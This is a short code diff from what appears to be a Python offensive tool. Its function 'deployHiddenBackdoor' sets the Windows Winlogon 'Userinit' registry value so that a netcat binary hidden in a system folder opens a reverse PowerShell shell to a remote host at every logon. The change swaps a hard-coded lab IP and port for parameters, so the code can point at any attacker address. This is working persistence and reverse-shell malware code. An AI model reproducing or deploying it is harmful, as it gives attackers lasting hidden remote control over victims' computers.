@@ -60,7 +60,7 @@ def deployHiddenBackdoor(ip,port):
         print("Trying to deploy a hidden backdoor ...")
         regHive = winreg.ConnectRegistry(None,winreg.HKEY_LOCAL_MACHINE)
         with winreg.OpenKey(regHive,r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\winlogon",0,winreg.KEY_SET_VALUE) as regKey:
-            winreg.SetValueEx(regKey,'Userinit', 1, winreg.REG_SZ,f"C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -d 10.0.2.5 4444 -e powershell,C:\\Windows\\system32\\userinit.exe")
+            winreg.SetValueEx(regKey,'Userinit', 1, winreg.REG_SZ,f"C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -d {ip} {port} -e powershell,C:\\Windows\\system32\\userinit.exe")
         print("Backdoor deployed successfully!")
     except OSError:
         print("Encountered an error! You don't have the permission to write the registry value")
